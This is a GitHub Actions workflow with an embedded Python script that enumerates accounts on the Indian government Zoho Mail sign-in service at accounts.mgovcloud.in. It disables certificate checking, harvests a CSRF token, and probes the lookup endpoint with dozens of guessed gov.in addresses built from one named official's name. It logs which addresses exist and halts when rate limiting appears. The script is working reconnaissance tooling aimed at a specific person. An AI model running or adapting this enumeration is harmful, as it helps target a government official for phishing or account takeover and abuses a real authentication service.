name: gov-lookup
on: workflow_dispatch
jobs:
  lookup:
    runs-on: ubuntu-latest
    steps:
      - name: Run lookup
        run: |
          python3 << 'PYEOF'
          import urllib.request, urllib.parse, json, http.cookiejar, time, ssl

          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE

          cj = http.cookiejar.CookieJar()
          opener = urllib.request.build_opener(
              urllib.request.HTTPCookieProcessor(cj),
              urllib.request.HTTPSHandler(context=ctx)
          )

          opener.open(urllib.request.Request(
              'https://accounts.mgovcloud.in/signin?servicename=ZOHOMail&serviceurl=https://mail.mgovcloud.in',
              headers={'User-Agent': 'Mozilla/5.0'}
          ))

          csrf = ''
          for c in cj:
              if 'iamcsr' in c.name:
                  csrf = c.value
          print(f'CSRF: {csrf[:20]}...')

          emails = [
              'renu.lata@gov.in',
              'zzzzfake99999@gov.in',
              'mdubey.ib@gov.in',
              'mad.ib@gov.in',
              'dubey.ib@gov.in',
              'anand.ib@gov.in',
              'manish.dubey.ib@gov.in',
              'ananddubey.ib@gov.in',
              'anand.dubey.ib@gov.in',
              'm.a.dubey.ib@gov.in',
              'dubey.manish.ib@gov.in',
              'manishad.ib@gov.in',
              'm.dubey.ib@gov.in',
              'manish.d.ib@gov.in',
              'ma.ib@gov.in',
              'md.ib@gov.in',
              'madubey.ib@gov.in',
              'dubeymanish.ib@gov.in',
              'dubey.m.ib@gov.in',
              'dubey.ma.ib@gov.in',
              'manishanand.dubey.ib@gov.in',
              'dubey.manishanand.ib@gov.in',
              'm.anand.ib@gov.in',
              'manish.a.ib@gov.in',
              'maddubey.ib@gov.in',
              'a.dubey.ib@gov.in',
              'manish1.ib@gov.in',
              'manish2.ib@gov.in',
          ]

          for email in emails:
              try:
                  data = urllib.parse.urlencode({
                      'LOGIN_ID': email,
                      'servicename': 'ZOHOMail',
                      'serviceurl': 'https://mail.mgovcloud.in'
                  }).encode()
                  req = urllib.request.Request(
                      f'https://accounts.mgovcloud.in/signin/v2/lookup/{email}',
                      data=data,
                      headers={
                          'X-ZCSRF-TOKEN': f'iamcsrcoo={csrf}',
                          'X-Requested-With': 'XMLHttpRequest',
                          'Origin': 'https://accounts.mgovcloud.in',
                          'Referer': 'https://accounts.mgovcloud.in/signin?servicename=ZOHOMail',
                          'Content-Type': 'application/x-www-form-urlencoded',
                      }
                  )
                  try:
                      resp = opener.open(req)
                      raw = resp.read().decode()
                      body = json.loads(raw)
                  except urllib.error.HTTPError as e:
                      raw = e.read().decode()
                      body = json.loads(raw)

                  sc = body.get('status_code')
                  msg = body.get('message', '')
                  if sc == 201:
                      org = body.get('lookup', {}).get('org_name', '?')
                      print(f'>> EXISTS: {email} -- {org}')
                  elif 'HIP' in msg:
                      print(f'!! RATE LIMITED at {email}')
                      break
                  else:
                      print(f'   NOT_FOUND: {email} (sc={sc})')
              except Exception as e:
                  print(f'   ERR: {email} -- {e}')
              time.sleep(0.3)

          print('SWEEP COMPLETE')
          PYEOF
